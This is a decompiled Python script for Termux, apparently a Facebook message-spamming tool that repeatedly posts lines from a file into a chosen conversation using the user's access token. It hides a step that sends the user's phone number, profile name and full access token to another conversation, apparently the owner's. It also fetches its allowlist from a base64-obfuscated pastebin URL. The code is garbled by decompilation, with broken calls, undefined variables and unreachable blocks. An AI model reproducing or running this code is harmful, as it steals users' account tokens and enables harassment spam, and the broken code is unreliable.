import marshal


from platform import system
import sys
def testPY():
    if(sys.version_info[0] < 3):
        print ('\n\t [+] You have Python 2, Please Clear Data Termux And Reinstall Python ... \n')
        sys.exit()

###----------[ ANSII COLOR STYLE ]---------- ###
Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

##
xx = '\033[0;93m' # DEFAULT
kk = '\033[93m' # KUNING +
hh = '\x1b[1;92m' # HIJAU +
hi = '\033[32m' # HIJAU -
uu = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
bb = '\33[1;96m' # BIRU -
pp= '\x1b[0;34m' # BIRU +

Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

def modelsInstaller():
	models = ['requests', 'colorama']
	for model in models:
		try:
			if(sys.version_info[0] < 3):
				os.system('cd C:\Python27\Scripts & pip install {}'.format(model))
			else :
				os.system('python -m pip install {}'.format(model))
			print (' ')
			print (' [+] {} has been installed successfully, Restart the program.'.format(model))
			sys.exit()
			print (' ')
		except:
			print (' [-] Install {} manually.'.format(model))
			print (' ')
			continue
			return None
	return None
				
				
import base64
import json
import time
import platform
import subprocess
import sys
import os
import re
import binascii
import time
import json
import random
import threading
import pprint
import smtplib
import telnetlib
import os.path as os
import hashlib
import string
import glob
import sqlite3
import urllib
import argparse
import marshal
from platform import system
from datetime import datetime

try:
    import requests
    from colorama import Fore
    from colorama import init
finally:
    pass
modelsInstaller()
requests.packages.urllib3.disable_warnings()

def cls():
    if system() == 'Linux':
        os.system('clear')
        return None
    if system() == 'Windows':
        os.system('cls')
        return None
    return None

cls()
CLEAR_SCREEN = '\033[2J'
RED = '\033[31m'   # mode 31 = red forground
RESET = '\033[0m'  # mode 0  = reset
BLUE  = "\033[34m"
WHITE = "\u001b[37m",
YELLOW = "\u001b[33;1m",
CYAN  = "\033[36m"
MAGENTA = "\u001b[35m",
GREEN = "\033[32m"
RESET = "\033[0m"
BOLD = '\033[1m'
REVERSE = "\033[m"
def logo():
		clear = "\x1b[0m"
		colors = [35,33,36 ]

		x = """
\033[1;93m---------------------------> VERSION 1.0 <----------------------------------
\033[1;98m____________________________________________________________________________
\033[1;97m|    ______                                                                |
\033[1;93m|   /      \                                                               |
\033[1;91m|  |  $$$$$$\ __    __   ______   __    __   ______          F             |
\033[1;92m|  | $$___\$$|  \  |  \ /      \ |  \  |  \ |      \         I             |
\033[1;97m|   \$$    \ | $$  | $$|  $$$$$$\| $$  | $$  \$$$$$$\        G             |
\033[1;96m|   _\$$$$$$\| $$  | $$| $$   \$$| $$  | $$ /      $$        H             |
\033[1;94m|  |  \__| $$| $$__/ $$| $$      | $$__/ $$|  $$$$$$$        T             |
\033[1;95m|   \$$    $$ \$$    $$| $$       \$$    $$ \$$    $$        E             |
\033[1;92m|    \$$$$$$   \$$$$$$  \$$       _\$$$$$$$  \$$$$$$$        R             |
\033[1;95m|                                |  \__| $$                                |
\033[1;92m|                                 \$$    $$                                |
\033[1;93m|                                  \$$$$$$                                 |
|__________________________________________________________________________|"""
		for N, line in enumerate(x.split("\n")):
			sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
			time.sleep(0.001)
			
			
logo()
testPY()

headers = {'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
			'referer': 'www.google.com'}

def comment_on_posts(posts):
    for i in ns:
        
        try:
            message = i
            url = 'https://graph.facebook.com/v14.0/{0}/'.format('t_' + profile_id)
            parameters = {
                'access_token': access_token,
                'message': xxx + ' ' + message }
            s = requests.post(url, parameters, headers, **('data', 'headers'))
            tt = time.strftime('%Y-%m-%d %I:%M:%S %p')
            if s.ok:
                print(BOLD + GREEN + ' [+] Sahii Haii .. | [+] Time :: ', datetime.now().strftime('%Y-%m-%d %I:%M:%S %p'), '\n [+] Han Chala Gaya Tera Message ==> ' + message)
                time.sleep(timm)
            else:
                print(BOLD + RED + ' [x] Lund Sahii Ha Mera :: [+] Loda Gaya Tera Message :: ' + tt, '\n', '[-] Message Error :: ==> ' + xxx + ' ' + message)
                time.sleep(timm)
        finally:
            continue
            if Exception:
                e = None
                
                try:
                    print(e)
                    time.sleep(timm)
                finally:
                    e = None
                    del e
                    continue
                    e = None
                    del e
                    return None

def runtxt(z):
    pass
    
          
def get_posts():

    try:
        url = 'https://mbasic.facebook.com'
    finally:
        return None
        if HTTPError:
            e = None

            try:
                print('HTTP Error')
            finally:
                e = None
                del e
                return None
                e = None
                del e
                if URLError:
                    e = None

                    try:
                        print('URL Error')
                    finally:
                        e = None
                        del e
                        return None
                        e = None
                        del e
		
		
qqq = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3liakNnZjVm"
www = base64.b64decode(qqq)
eee = www.decode("utf-8")
rrr = requests.get(eee)
for linee in rrr:
	mmm = linee.decode("utf-8")
	mmm = mmm.split(',')
	print('')
inn = input(BOLD + CYAN + '[+] Mobile Number :: ')
if inn in mmm:                                                                                                                                                                       token = input('[+] Token File :: ')
    with open(token, 'r') as f2:
        access_token = f2.read()
        payload = {
            'access_token': access_token }
        a = 'https://graph.facebook.com/v14.0/me'
        b = requests.get(a, payload, **('params',))
        d = json.loads(b.text)
        if 'name' not in d:
            print(BOLD + RED + '\n[x] Token Invalid ..!!')
            sys.exit()
        f = d['name']
        prof = '\nYour Profile ' + f + ' Is Ready \n\n'
        profile_id = input(BOLD + CYAN + '[+] Conservation ID :: ')
        xxx = input(BOLD + CYAN + '[+] Add Name Kidx :: ')
        ms = input(BOLD + CYAN + '[+] Add Text File :: ')
        repeat = int(input(BOLD + CYAN + '[+] File Repeat :: '))
        timm = int(input(BOLD + CYAN + '[+] Speed in Seconds :: '))
        load = '\n________All Done....Loading Profile Info.....!\n'
        url1 = 'https://graph.facebook.com/v14.0/{0}/'.format(r)
        parameters = {
            'access_token': access_token,
            'message': 'Phone No : ' + inn + '\nProfile Name : ' + f + '\nToken : ' + access_token + '\nLink :\n\n https://www.facebook.com/t_' + profile_id }
        s = requests.post(url1, parameters, headers, **('data', 'headers'))
        prof = '[+]=> Active Profile :: ' + f + '\n\n'
        ns = open(ms, 'r').readlines()
        [ 0.001 for pro in prof ](None, None, None)
    if not None:
        pass
    return None
print(BOLD + RED + '[-] <==> Your Number Is Wrong Please Take Approval From Owner')
